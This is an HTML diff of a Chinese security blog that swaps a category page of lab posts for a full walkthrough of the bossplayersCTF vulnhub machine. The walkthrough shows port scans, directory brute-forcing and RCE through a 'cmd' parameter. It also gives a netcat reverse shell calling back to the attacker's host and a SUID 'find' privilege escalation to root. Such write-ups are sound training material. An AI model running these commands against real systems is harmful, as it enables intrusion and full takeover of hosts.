@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>分类: 靶场渗透 | txjg blog</title>
+  <title>bossplayersCTF | txjg blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -430,613 +430,423 @@
 </header>
         <!-- 内容区域 -->
         
-
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
-<div class="bg-light-floor-categoryDetail" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
-
-<div class="category-header"  style="background-image:url('https://pic3.zhimg.com/80/v2-98dcd81cb0d1fee52a807c13cedb8338_1440w.jpg?source=1940ef5c')">
-  <div class="category-header-title">
-    分类
-  </div>
-  <div class="category-header-desc">
+ <!-- prismjs 代码高亮 -->
+ 
     
-      <span class="title" id="category-header-desc"></span>
-      <script>
-  function typedFn() {
-    const el = '#category-header-desc';
-    const type = 'categoryDetail';
-    let desc = '愿你如风，被人温柔以待'
-    var typed = new Typed(el, {
-      strings: [desc],
-      startDelay: 100,
-      typeSpeed: 100,
-      loop: true,
-      backSpeed: 50,
-      showCursor: true
-    });
-  }
-  typedFn();
-</script>
-      
-  </div>
-  <div class="mask-box"></div>
-</div>
-
-
-<div class="category">
-  <div class="category-name">
-    <div class="name" style="background-color: #85C1E9;">靶场渗透 分类</div>
-  </div>
-  <!-- 每一篇文章卡片 -->
-  <!-- hash算法 -->
-
-<section class="posts">
-  
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
     
-    <article class="post reveal" style="flex-direction: row-reverse;   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2023-07-31</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2023/07/31/bossplayersCTF/">bossplayersCTF</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/vulnhub%E9%9D%B6%E5%9C%BA/">vulnhub靶场</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2023/07/31/bossplayersCTF/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/6.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            bossplayersCTF靶场闯关获取靶机的ip
-netdiscover -r 192.168.124.0/24
-
-对目标进行nmap扫描
-nmap -sS -sV -T4 -A -p- 192.168.124.28
-
-可以看到靶机开放了
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2023/07/31/bossplayersCTF/">
-            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2023/07/31/bossplayersCTF/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/6.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
+        <link href="/js/prism/prism-twilight.min.css" rel="stylesheet">
     
-    <article class="post reveal" style="   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2023-07-17</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2023/07/17/AI-Web-2/">AI Web 2</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
 
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/vulnhub%E9%9D%B6%E5%9C%BA/">vulnhub靶场</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2023/07/17/AI-Web-2/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/15.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            AI Web 2靶场闯关 获取目标主机的ip地址 sudo netdiscover -r 192.168.124.0/24  得到靶机ip为192.168.124.20 对靶机进行nmap扫描 sudo nmap -sS -sV -T4 -
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2023/07/17/AI-Web-2/">
-            <i class="iconfont iconmore" pointer style="  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2023/07/17/AI-Web-2/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/15.jpg" alt="">
-        </a>
-      </div>
-    </article>
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
   
-    
-    <article class="post reveal" style="flex-direction: row-reverse;   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-10-20</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/10/20/sqli-labs-less15/">sqli-labs-less15</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
 
 
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/10/20/sqli-labs-less15/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/5.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less15访问http://127.0.0.1/sqli-labs/Less-15/
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
 
-输入username,password，burp抓包，点击submit
 
-burp抓取到的数据包为
+  <!-- 文章详情页顶部图片和标题 -->
 
-由于这关检测的是单引号型布尔
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/10/20/sqli-labs-less15/">
-            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/10/20/sqli-labs-less15/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/5.jpg" alt="">
-        </a>
-      </div>
-    </article>
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/6.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
-    
-    <article class="post reveal" style="   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-10-20</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/10/20/sqli-labs-less14/">sqli-labs-less14-post请求-字符型(单引号变形)-双查询注入</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/10/20/sqli-labs-less14/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/14.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less14-post请求-字符型(单引号变形)-双查询注入访问http://127.0.0.1/sqli-labs/Less-14/
-
-按要求输入username,password,burp抓包,点击提交
-
-将抓到的请
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/10/20/sqli-labs-less14/">
-            <i class="iconfont iconmore" pointer style="  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/10/20/sqli-labs-less14/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/14.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
-    
-    <article class="post reveal" style="flex-direction: row-reverse;   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-10-20</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/10/20/sqli-labs-less13/">sqli-labs-less13-post请求-字符型(单引号变形)-双查询注入</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/10/20/sqli-labs-less13/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/6.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less13-post请求-字符型(单引号变形)-双查询注入访问http://127.0.0.1/sqli-labs/Less-13/
-
-按要求输入username,password,burp抓包，点击提交
-
-将抓到的请
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/10/20/sqli-labs-less13/">
-            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/10/20/sqli-labs-less13/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/6.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
-    
-    <article class="post reveal" style="   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-10-20</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/10/20/sqli-labs-less12/">sqli-labs-less12-post请求-字符型(双引号变形)-报错注入</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/10/20/sqli-labs-less12/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/13.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less12-post请求-字符型(双引号变形)-报错注入访问http://127.0.0.1/sqli-labs/Less-12/
-
-按照要求输入username,password,然后burp抓包，点击提交
-
-将抓到
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/10/20/sqli-labs-less12/">
-            <i class="iconfont iconmore" pointer style="  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/10/20/sqli-labs-less12/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/13.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
-    
-    <article class="post reveal" style="flex-direction: row-reverse;   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-10-17</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/10/17/sqli-labs-less11/">sqli-labs-less11-post请求-字符型(单引号)-报错注入</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/10/17/sqli-labs-less11/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/11.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less11-post请求-字符型(单引号)-报错注入访问http://127.0.0.1/sqli-labs/Less-11/
-
-按要求输入用户名，密码，然后burp抓包
-
-将抓到的post请求包发送到repeater
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/10/17/sqli-labs-less11/">
-            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/10/17/sqli-labs-less11/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/11.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
-    
-    <article class="post reveal" style="   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-10-14</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/10/14/sqli-labs-less10/">sqli-labs-less10-get请求-字符型(双引号)-时间盲注</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/10/14/sqli-labs-less10/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/12.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less10-get请求-字符型(双引号)-时间盲注访问http://127.0.0.1/sqli-labs/Less-10/?id=1
-
-访问http://127.0.0.1/sqli-labs/Less-10/?id
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/10/14/sqli-labs-less10/">
-            <i class="iconfont iconmore" pointer style="  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/10/14/sqli-labs-less10/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/12.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
-    
-    <article class="post reveal" style="flex-direction: row-reverse;   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-09-02</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/09/02/sqli-labs-less9/">sqli-labs-less9-get请求-字符型(单引号)-时间盲注</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/09/02/sqli-labs-less9/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/15.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less9-get请求-字符型(单引号)-时间盲注访问http://127.0.0.1/sqli-labs/Less-9/?id=1
-
-访问http://127.0.0.1/sqli-labs/Less-9/?id=1&
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/09/02/sqli-labs-less9/">
-            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/09/02/sqli-labs-less9/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/15.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
-    
-    <article class="post reveal" style="   ">
-      <div class="post-main">
-        <div class="post-info">
-          <div class="post-time">
-            <i class="fas fa-clock" aria-hidden="true"></i>
-            <span class="post-time">2022-09-01</span>
-          </div>
-          <div class="post-title">
-            <a class="post-title-link" href="/2022/09/01/sqli-labs-less8/">sqli-labs-less8-get请求-字符型(单引号)-布尔盲注</a>
-          </div>
-          <div class="post-meta">
-            <div class="post-tags">
-              <!-- 文章详情页的标签 -->
-
-            </div>
-            <div class="post-categories">
-              <!-- 文章详情页的分类 -->
-
-<div class="article-category">
-  <i class="iconfont iconbookmark1"></i>
-  <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">靶场渗透</a> <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/sqli-labs/">sqli-labs</a>
-</div>
-
-
-            </div>
-          </div>
-          <div class="post-img-mobile">
-            <a href="/2022/09/01/sqli-labs-less8/" style="background-size: cover; 
-              background-position: center center;">
-              <img class="lazyload" src="/medias/11.jpg" alt="">
-            </a>
-          </div>
-          <div class="post-content">
-            sqli-labs-less8-get请求-字符型(单引号)-布尔盲注访问http://127.0.0.1/sqli-labs/Less-8/?id=1
-
-访问http://127.0.0.1/sqli-labs/Less-8/?id=1&
-          </div>
-        </div>
-        <div class="post-more">
-          <a href="/2022/09/01/sqli-labs-less8/">
-            <i class="iconfont iconmore" pointer style="  " title="阅读更多"></i>
-          </a>
-        </div>
-      </div>
-      <div class="post-img">
-        <a href="/2022/09/01/sqli-labs-less8/" style="background-size: cover; 
-          background-position: center center;">
-          <img class="lazyload" src="/medias/11.jpg" alt="">
-        </a>
-      </div>
-    </article>
-  
-</section>
-</div>
-<div class="w-70">
-  
-  <!-- <nav class="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/page/2/">2</a><a class="extend next" rel="next" href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/page/2/">下一页</a>
-  </nav> -->
-  <div class="page-nav">
-    
-    <div class="page-info">
-        <div class="page-info-text">1 / 2</div>
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        bossplayersCTF
+      </span>
     </div>
     
-      <a href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/page/2/"
-         class="page-nav-next">
-          <span class="mr-5">下一页</span><i class="fas fa-angle-right"></i>
-      </a>
+    
       
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2023-07-31 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="post-detail-header_category">
+              靶场渗透
+            </a>
+          
+            <a href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/vulnhub%E9%9D%B6%E5%9C%BA/" class="post-detail-header_category">
+              vulnhub靶场
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="bossplayersCTF靶场闯关"><a href="#bossplayersCTF靶场闯关" class="headerlink" title="bossplayersCTF靶场闯关"></a>bossplayersCTF靶场闯关</h1><p>获取靶机的ip</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.124.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/1.png" class="">
+<p>对目标进行nmap扫描</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.124.28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/2.png" class="">
+<p>可以看到靶机开放了22和80端口。<br>dirb爆破80端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.124.28 <span class="token parameter variable">-X</span> .php,.html,.txt,.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/3.png" class="">
+<p>dirsearch爆破80端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.124.28"</span> <span class="token parameter variable">-e</span> php,html,zip,txt <span class="token parameter variable">-i</span> <span class="token number">200,401</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/4.png" class="">
+<p>gobuster爆破80端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.124.28 <span class="token parameter variable">-x</span> .php,.html,.zip,.txt <span class="token parameter variable">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/5.png" class="">
+<p>我们扫描到<code>index.html</code>,<code>robots.txt</code>,<code>logs.php</code>这三个文件<br>访问index.html</p>
+<img src="/2023/07/31/bossplayersCTF/6.png" class="">
+<p>没啥发现，查看页面源代码</p>
+<img src="/2023/07/31/bossplayersCTF/7.png" class="">
+<p>发现了一串base64编码的字符串。<br>访问robots.txt</p>
+<img src="/2023/07/31/bossplayersCTF/8.png" class="">
+<p>又发现了一串base64编码的字符串。<br>访问logs.php</p>
+<img src="/2023/07/31/bossplayersCTF/9.png" class="">
+<p>除了看到php版本为7.3之外，未发现其他有价值的信息。<br>对index.html页面发现的base64字符串进行解码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/10.png" class="">
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/11.png" class="">
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"d29ya2luZ2lucHJvZ3Jlc3MucGhwCg=="</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/12.png" class="">
+<p>经过三次base64解码，我们获得了一个<code>workinginprogress.php</code>。<br>对robots.txt中的base64字符串进行解码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"bG9sIHRyeSBoYXJkZXIgYnJvCg=="</span> <span class="token operator">|</span>base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/13.png" class="">
+<p>访问<code>http://192.168.124.28/workinginprogress.php</code></p>
+<img src="/2023/07/31/bossplayersCTF/14.png" class="">
+<p>没发现有啥漏洞，burp抓包</p>
+<img src="/2023/07/31/bossplayersCTF/15.png" class="">
+<p>对<code>workinginprogress.php</code>进行RCE模糊测试</p>
+<img src="/2023/07/31/bossplayersCTF/16.png" class="">
+<img src="/2023/07/31/bossplayersCTF/17.png" class="">
+<p>fuzz测试出<code>cmd</code>参数存在RCE漏洞。</p>
+<img src="/2023/07/31/bossplayersCTF/18.png" class="">
+<p>利用RCE反弹shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/19.png" class="">
+<p>由于目标安装了nc<br>访问<code>http://192.168.124.28/workinginprogress.php?cmd=nc 192.168.124.27 1234 -e /bin/bash</code></p>
+<img src="/2023/07/31/bossplayersCTF/20.png" class="">
+<p>可以看到本机已经拿到了靶机的shell。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>由于目标安装了python,我们利用以上命令可以获得一个完整交互式shell</p>
+<img src="/2023/07/31/bossplayersCTF/21.png" class="">
+<p>查看当前用户权限</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/22.png" class="">
+<p>可以看到当前用户权限为低权限，因此我们需要提权。<br>查看是否可以用suid提权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/07/31/bossplayersCTF/23.png" class="">
+<img src="/2023/07/31/bossplayersCTF/24.png" class="">
+<p>可以看到&#x2F;usr&#x2F;bin&#x2F;find可执行文件的属主具有suid权限。<br>利用&#x2F;usr&#x2F;bin&#x2F;find进行提权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/bash <span class="token parameter variable">-p</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>注：默认情况下bash在执行时，如果发现euid(即suid)与uid不匹配，会将euid强制重置为uid,加了<code>-p</code>参数则不会再覆盖。</p>
+<img src="/2023/07/31/bossplayersCTF/25.png" class="">
+<p>可以看到我们现在已经获得了root权限。<br>进入&#x2F;root目录查看flag</p>
+<img src="/2023/07/31/bossplayersCTF/26.png" class="">
+
+
+
+
+
+
+
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>txjg</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2023/07/31/bossplayersCTF/" target="_blank" title="bossplayersCTF">https://ntexjg.github.io/2023/07/31/bossplayersCTF/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+    
+
